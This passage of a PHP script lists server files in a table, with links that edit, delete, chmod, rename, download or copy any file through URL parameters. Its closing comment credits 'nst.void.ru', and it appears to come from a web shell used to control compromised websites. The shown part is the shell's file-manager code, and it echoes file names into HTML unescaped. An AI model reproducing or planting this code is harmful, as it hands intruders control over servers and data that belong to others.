}

for($i=0; $i<count($files); $i++){

$size=@filesize($d."/".$files[$i]);
$perms = @fileperms($d."/".$files[$i]);
$owner = @fileowner($d."/".$files[$i]);
if($os=="unix"){
$fileownera=posix_getpwuid($owner);
$owner=$fileownera['name'];
}
$group = @filegroup($d."/".$files[$i]);
if($os=="unix"){
$groupinfo = posix_getgrgid($group);
$group=$groupinfo['name'];
}
$info=perm($perms);
if($i%2){$color="#D1D1D1";}else{$color="#D7FFA8";}

if ($size < 1024){$siz=$size.' b';
}else{
if ($size < 1024*1024){$siz=number_format(($size/1024), 2, '.', '').' kb';}else{
if ($size < 1000000000){$siz=number_format($size/(1024*1024), 2, '.', '').' mb';}else{
if ($size < 1000000000000){$siz=number_format($size/(1024*1024*1024), 2, '.', '').' gb';}
}}}
echo "<tr><td bgcolor=$color><font face=wingdings size=3>2</font> <a href='$php_self?d=$d&e=$files[$i]'>$files[$i]</a></td><td bgcolor=$color><center><a href=\"javascript:ShowOrHide('$i','')\">[options]</a><div id='$i' style='display:none;z-index:1;' ><a href='$php_self?d=$d&ef=$files[$i]&edit=1' title='Edit $files[$i]'><b>Edit</b></a><br><a href='$php_self?d=$d&del_f=1&wich_f=$files[$i]' title='Delete $files[$i]'><b>Delete</b></a><br><a href='$php_self?d=$d&chmod=1&wich_f=$files[$i]' title='chmod $files[$i]'><b>CHMOD</b></a><br><a href='$php_self?d=$d&rename=1&wich_f=$files[$i]' title='Rename $files[$i]'><b>Rename</b></a><br><a href='$php_self?d=$d&download=$files[$i]' title='Download $files[$i]'><b>Download</b></a><br><a href='$php_self?d=$d&ccopy_to=$files[$i]' title='Copy $files[$i] to?'><b>Copy</b></a></div></td><td bgcolor=$color>$siz</td><td bgcolor=$color><center>$owner/$group</td><td bgcolor=$color>$info</td></tr>";
}

echo "</table></td></tr></table>";
echo $copyr;

?>
<!-- Network security team :: nst.void.ru -->